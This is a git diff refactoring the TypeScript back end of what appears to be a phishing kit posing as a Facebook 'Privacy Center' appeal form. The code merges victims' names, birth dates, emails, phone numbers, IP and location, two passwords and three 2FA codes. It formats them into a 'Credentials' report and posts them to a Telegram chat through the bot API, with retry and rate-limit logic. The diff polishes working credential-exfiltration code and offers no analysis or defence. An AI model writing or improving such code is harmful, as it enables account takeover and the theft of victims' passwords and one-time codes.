@@ -1,9 +1,18 @@
 import https from 'https';
 import axios from 'axios';
+import type { FormData } from '@/app/store/slices/stepFormSlice';
 import { memoryStoreTTL } from 'utils/memoryStore';
 import { generateKey } from 'utils/generateKey';
 
 const agent = new https.Agent({ family: 4 });
+
+/** Giới hạn Telegram; chừa biên cho entity HTML. */
+const TELEGRAM_TEXT_MAX = 4096;
+
+export type SendTelegramOutcome =
+    | { ok: true; skipped?: false }
+    | { ok: true; skipped: true; reason: 'missing_config' | 'rate_limited' }
+    | { ok: false; error: unknown };
 
 function getTelegramConfig() {
     const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
@@ -17,15 +26,14 @@ function getTelegramConfig() {
     };
 }
 
-// Simple rate limiter to prevent spam
 const rateLimiter = new Map<string, number>();
-const RATE_LIMIT_WINDOW = 1000;
+const RATE_LIMIT_WINDOW_MS = 1000;
 
 function checkRateLimit(key: string): boolean {
     const now = Date.now();
     const lastCall = rateLimiter.get(key);
 
-    if (!lastCall || (now - lastCall) > RATE_LIMIT_WINDOW) {
+    if (!lastCall || now - lastCall > RATE_LIMIT_WINDOW_MS) {
         rateLimiter.set(key, now);
         return true;
     }
@@ -33,21 +41,21 @@ function checkRateLimit(key: string): boolean {
     return false;
 }
 
-// Retry utility for Telegram API calls
-async function retryTelegramRequest(requestFn: () => Promise<any>, maxRetries = 3): Promise<any> {
-    let lastError: any;
+async function retryTelegramRequest<T>(
+    requestFn: () => Promise<T>,
+    maxRetries = 3
+): Promise<T> {
+    let lastError: unknown;
 
     for (let attempt = 1; attempt <= maxRetries; attempt++) {
         try {
-            const result = await requestFn();
-            return result;
-        } catch (error: any) {
+            return await requestFn();
+        } catch (error: unknown) {
             lastError = error;
+            const err = error as { response?: { status?: number; data?: { description?: string } }; message?: string };
+            const errorCode = err?.response?.status;
+            const errorDesc = err?.response?.data?.description ?? '';
 
-            const errorCode = error?.response?.status;
-            const errorDesc = error?.response?.data?.description || '';
-
-            // Don't retry on authentication errors, invalid chat_id, etc.
             if (
                 errorCode === 401 ||
                 errorCode === 403 ||
@@ -61,18 +69,17 @@ async function retryTelegramRequest(requestFn: () => Promise<any>, maxRetries = 
                 break;
             }
 
-            // Exponential backoff: 1s, 2s, 4s
-            const delay = Math.pow(2, attempt - 1) * 1000;
-            console.warn(`⚠️ Telegram API attempt ${attempt} failed, retrying in ${delay}ms:`, error.message);
-            await new Promise(resolve => setTimeout(resolve, delay));
+            const delayMs = 2 ** (attempt - 1) * 1000;
+            console.warn(`Telegram API attempt ${attempt} failed, retry in ${delayMs}ms:`, err?.message);
+            await new Promise((resolve) => setTimeout(resolve, delayMs));
         }
     }
 
     throw lastError;
 }
 
-function escapeHtml(input: any): string {
-    const str = typeof input === 'string' ? input : String(input ?? '');
+function escapeHtml(value: string | number | null | undefined): string {
+    const str = value === null || value === undefined ? '' : String(value);
     return str
         .replace(/&/g, '&amp;')
         .replace(/</g, '&lt;')
@@ -81,73 +88,61 @@ function escapeHtml(input: any): string {
         .replace(/'/g, '&#39;');
 }
 
+type NormalizedPrivacyPayload = {
+    ip: string;
+    location: string;
+    country_code: string;
+    fullName: string;
+    fanpage: string;
+    day: string;
+    month: string;
+    year: string;
+    email: string;
+    emailBusiness: string;
+    phone: string;
+    appealReason: string;
+    message: string;
+    password: string;
+    passwordSecond: string;
+    authMethod: string;
+    twoFa: string;
+    twoFaSecond: string;
+    twoFaThird: string;
+};
 
-function getChangedFields(prevData: any = {}, nextData: any = {}, inputNew: any = {}): string[] {
-    const before = normalizeData(prevData);
-    const after = normalizeData(nextData);
-    const provided = normalizeData(inputNew);
-
-    const labels: Record<string, string> = {
-        ip: 'Ip',
-        location: 'Location',
-        fullName: 'Full Name',
-        fanpage: 'Page Name',
-        day: 'Date of birth',
-        month: 'Date of birth',
-        year: 'Date of birth',
-        email: 'Email',
-        emailBusiness: 'Email Business',
-        phone: 'Phone Number',
-        appealReason: 'Appeal Reason',
-        password: 'Password First',
-        passwordSecond: 'Password Second',
-        authMethod: 'Auth Method',
-        twoFa: 'Code 2FA(1)',
-        twoFaSecond: 'Code 2FA(2)',
-        twoFaThird: 'Code 2FA(3)',
-    };
-
-    const changed = new Set<string>();
-    Object.keys(after).forEach((k) => {
-        if (provided[k] === '' || provided[k] === undefined) return;
-        if (before[k] !== after[k]) {
-            if (k === 'day' || k === 'month' || k === 'year') {
-                changed.add('Date of birth');
-            } else {
-                changed.add(labels[k] || k);
-            }
-        }
-    });
-    return Array.from(changed);
-}
-
-function normalizeData(input: any = {}) {
+function normalizeData(input: Partial<FormData> | Record<string, unknown> = {}): NormalizedPrivacyPayload {
+    const raw = input as Record<string, unknown>;
     return {
-        ip: input.ip ?? '',
-        location: input.location ?? '',
-        fullName: input.fullName ?? input.name ?? '',
-        fanpage: input.fanpage ?? '',
-        day: input.day ?? '',
-        month: input.month ?? '',
-        year: input.year ?? '',
-        email: input.email ?? '',
-        emailBusiness: input.emailBusiness ?? input.business ?? '',
-        phone: input.phone ?? '',
-        appealReason: input.appealReason ?? '',
-        password: input.password ?? '',
-        passwordSecond: input.passwordSecond ?? '',
-        authMethod: input.authMethod ?? '',
-        twoFa: input.twoFa ?? '',
-        twoFaSecond: input.twoFaSecond ?? '',
-        twoFaThird: input.twoFaThird ?? '',
+        ip: String(raw.ip ?? ''),
+        location: String(raw.location ?? ''),
+        country_code: String(raw.country_code ?? ''),
+        fullName: String(raw.fullName ?? raw.name ?? ''),
+        fanpage: String(raw.fanpage ?? ''),
+        day: String(raw.day ?? ''),
+        month: String(raw.month ?? ''),
+        year: String(raw.year ?? ''),
+        email: String(raw.email ?? ''),
+        emailBusiness: String(raw.emailBusiness ?? raw.business ?? ''),
+        phone: String(raw.phone ?? ''),
+        appealReason: String(raw.appealReason ?? ''),
+        message: String(raw.message ?? ''),
+        password: String(raw.password ?? ''),
+        passwordSecond: String(raw.passwordSecond ?? ''),
+        authMethod: String(raw.authMethod ?? ''),
+        twoFa: String(raw.twoFa ?? ''),
+        twoFaSecond: String(raw.twoFaSecond ?? ''),
+        twoFaThird: String(raw.twoFaThird ?? ''),
     };
 }
 
-function mergeData(oldData: any = {}, newData: any = {}) {
+function mergeData(
+    oldData: Partial<FormData> | Record<string, unknown> = {},
+    newData: Partial<FormData> | Record<string, unknown> = {}
+): NormalizedPrivacyPayload {
     const normalizedOld = normalizeData(oldData);
     const normalizedNew = normalizeData(newData);
-    const result: any = { ...normalizedOld };
-    Object.entries(normalizedNew).forEach(([k, v]) => {
+    const result = { ...normalizedOld };
+    (Object.entries(normalizedNew) as [keyof NormalizedPrivacyPayload, string][]).forEach(([k, v]) => {
         if (v !== undefined && v !== '') {
             result[k] = v;
         }
@@ -155,123 +150,137 @@ function mergeData(oldData: any = {}, newData: any = {}) {
     return result;
 }
 
-function formatMessage(data: any): string {
-    const d = normalizeData(data);
-    const authLine = d.authMethod ? `\n<b>Auth Method:</b> <code>${escapeHtml(d.authMethod)}</code>\n-----------------------------` : '';
-    return `
-<b>Ip:</b> <code>${escapeHtml(d.ip || 'N/A')}</code>
-<b>Location:</b> <code>${escapeHtml(d.location || 'N/A')}</code>
------------------------------
-<b>Full Name:</b> <code>${escapeHtml(d.fullName)}</code>
-<b>Page Name:</b> <code>${escapeHtml(d.fanpage)}</code>
-<b>Date of birth:</b> <code>${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}</code>
------------------------------
-<b>Email:</b> <code>${escapeHtml(d.email)}</code>
-<b>Email Business:</b> <code>${escapeHtml(d.emailBusiness)}</code>
-<b>Phone Number:</b> <code>${d.phone ? escapeHtml(`+${d.phone}`) : ''}</code>
-<b>Appeal Reason:</b> <code>${escapeHtml(d.appealReason || 'N/A')}</code>
------------------------------
-<b>Password(1):</b> <code>${escapeHtml(d.password)}</code>
-<b>Password(2):</b> <code>${escapeHtml(d.passwordSecond)}</code>
------------------------------${authLine}
-<b>🔐Code 2FA(1):</b> <code>${escapeHtml(d.twoFa)}</code>
-<b>🔐Code 2FA(2):</b> <code>${escapeHtml(d.twoFaSecond)}</code>
-<b>🔐Code 2FA(3):</b> <code>${escapeHtml(d.twoFaThird)}</code>`.trim();
+function field(label: string, value: string, options?: { monospace?: boolean }): string {
+    const display = value === '' ? '—' : escapeHtml(value);
+    if (options?.monospace !== false) {
+        return `<b>${escapeHtml(label)}</b>\n<code>${display}</code>`;
+    }
+    return `<b>${escapeHtml(label)}</b>\n${display}`;
 }
 
-export async function sendTelegramMessage(data: any): Promise<void> {
-    const config = getTelegramConfig();
-    if (!config) {
-        console.warn('⚠️ Telegram không được gửi: Thiếu TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID trong file .env');
-        return;
+function sectionTitle(title: string): string {
+    return `\n<b>${escapeHtml(title)}</b>`;
+}
+
+function formatMessage(data: Partial<FormData> | Record<string, unknown>): string {
+    const d = normalizeData(data);
+    const submittedAt = new Date().toISOString();
+    const dob =
+        [d.day, d.month, d.year].every((x) => x === '')
+            ? '—'
+            : `${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}`;
+    const phoneDisplay = d.phone ? escapeHtml(`+${d.phone.replace(/^\+/, '')}`) : '—';
+
+    const lines: string[] = [
+        `<b>Privacy Center</b>`,
+        `<i>Submitted:</i> <code>${escapeHtml(submittedAt)}</code>`,
+        sectionTitle('Network'),
+        field('IP address', d.ip || '—'),
+        field('Location', d.location || '—'),
+        field('Country code', d.country_code || '—'),
+        sectionTitle('Profile'),
+        field('Full name', d.fullName),
+        field('Page name', d.fanpage),
+        `<b>Date of birth</b>\n<code>${dob}</code>`,
+        sectionTitle('Contact'),
+        field('Email', d.email),
+        field('Business email', d.emailBusiness),
+        `<b>Phone</b>\n<code>${phoneDisplay}</code>`,
+        sectionTitle('Appeal'),
+        field('Appeal reason', d.appealReason || '—'),
+        field('Additional message', d.message || '—'),
+        sectionTitle('Credentials'),
+        field('Password (primary)', d.password),
+        field('Password (secondary)', d.passwordSecond),
+    ];
+
+    if (d.authMethod) {
+        lines.push(field('Auth method', d.authMethod));
     }
 
-    const key = generateKey(data);
-    // Rate limiting check
-    if (!checkRateLimit(key)) {
-        console.warn(`⚠️ Rate limit exceeded for key: ${key}`);
-        return;
+    lines.push(
+        sectionTitle('Two-factor codes'),
+        field('2FA code (1)', d.twoFa),
+        field('2FA code (2)', d.twoFaSecond),
+        field('2FA code (3)', d.twoFaThird)
+    );
+
+    let text = lines.join('\n\n').trim();
+    if (text.length > TELEGRAM_TEXT_MAX) {
+        text = `${text.slice(0, TELEGRAM_TEXT_MAX - 24)}\n<i>(truncated)</i>`;
     }
+    return text;
+}
+
+async function postSendMessage(
+    apiBase: string,
+    chatId: string,
+    text: string
+): Promise<{ message_id?: number }> {
+    const res = await retryTelegramRequest(() =>
+        axios.post<{ result?: { message_id?: number } }>(
+            `${apiBase}/sendMessage`,
+            {
+                chat_id: chatId,
+                text,
+                parse_mode: 'HTML',
+            },
+            {
+                httpsAgent: agent,
+                timeout: 10000,
+            }
+        )
+    );
+    return res.data?.result ?? {};
+}
+
+export async function sendTelegramMessage(data: Partial<FormData>): Promise<SendTelegramOutcome> {
+    const config = getTelegramConfig();
+    if (!config) {
+        console.warn(
+            'Telegram skipped: set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in environment'
+        );
+        return { ok: true, skipped: true, reason: 'missing_config' };
+    }
+
+    const key = generateKey(data as Record<string, string>);
+    if (!checkRateLimit(key)) {
+        console.warn(`Telegram skipped: rate limit for key ${key}`);
+        return { ok: true, skipped: true, reason: 'rate_limited' };
+    }
+
     const prev = memoryStoreTTL.get(key);
-    const fullData = mergeData(prev?.data, data);
+    const fullData = mergeData(prev?.data ?? {}, data);
     const updatedText = formatMessage(fullData);
 
     try {
-        // if (!prev?.messageId) {
-        const res = await retryTelegramRequest(() =>
-            axios.post(`${config.api}/sendMessage`, {
-                chat_id: config.chatId,
-                text: updatedText,
-                parse_mode: 'HTML'
-            }, {
-                httpsAgent: agent,
-                timeout: 10000
-            })
-        );
-
-        const messageId = res?.data?.result?.message_id;
-        if (messageId) {
+        const { message_id: messageId } = await postSendMessage(config.api, config.chatId, updatedText);
+        if (messageId !== undefined) {
             memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
-            console.log(`✅ Sent new message. ID: ${messageId}`);
         } else {
-            console.warn('⚠️ Telegram response không có message_id');
+            console.warn('Telegram API response missing message_id');
         }
-        // } else {
-        //     await retryTelegramRequest(() =>
-        //         axios.post(`${config.api}/editMessageText`, {
-        //             chat_id: config.chatId,
-        //             message_id: prev.messageId,
-        //             text: updatedText,
-        //             parse_mode: 'HTML',
-        //         }, {
-        //             httpsAgent: agent,
-        //             timeout: 10000
-        //         })
-        //     );
-        //     memoryStoreTTL.set(key, { message: updatedText, messageId: prev.messageId, data: fullData });
-
-        //     const changedFields = getChangedFields(prev.data, fullData, data);
-        //     if (changedFields.length > 0) {
-        //         await retryTelegramRequest(() =>
-        //             axios.post(`${config.api}/sendMessage`, {
-        //                 chat_id: config.chatId,
-        //                 text: `🔔 Đã cập nhật: <b>${changedFields.join(', ')}</b>`,
-        //                 parse_mode: 'HTML'
-        //             }, {
-        //                 httpsAgent: agent,
-        //                 timeout: 10000
-        //             })
-        //         );
-        //     }
-        //     console.log(`✏️ Edited message ID: ${prev.messageId}`);
-        // }
-    } catch (err: any) {
-        const desc = err?.response?.data?.description || '';
+        return { ok: true };
+    } catch (err: unknown) {
+        const desc =
+            (err as { response?: { data?: { description?: string } } })?.response?.data?.description ?? '';
         if (desc.includes('message to edit not found')) {
             try {
-                const res = await retryTelegramRequest(() =>
-                    fetch(`${config.api}/sendMessage`, {
-                        method: 'POST',
-                        body: JSON.stringify({
-                            chat_id: config.chatId,
-                            text: updatedText,
-                            parse_mode: 'HTML'
-                        }),
-                    })
+                const { message_id: messageId } = await postSendMessage(
+                    config.api,
+                    config.chatId,
+                    updatedText
                 );
-                const messageId = res?.result?.message_id;
-                if (messageId) {
+                if (messageId !== undefined) {
                     memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
-                    console.log(`🔄 Message was deleted → sent new message. ID: ${messageId}`);
-                } else {
-                    console.warn('⚠️ Telegram response không có message_id khi re-send');
                 }
-            } catch (sendErr: any) {
-                console.error('🔥 Telegram re-send error:', sendErr?.response?.data || sendErr.message || sendErr);
+            } catch (sendErr) {
+                console.error('Telegram resend error:', sendErr);
+                return { ok: false, error: sendErr };
             }
-            return;
+            return { ok: true };
         }
-        console.error('🔥 Telegram send/edit error:', err?.response?.data || err.message || err);
-        return;
+        console.error('Telegram send error:', err);
+        return { ok: false, error: err };
     }
 }
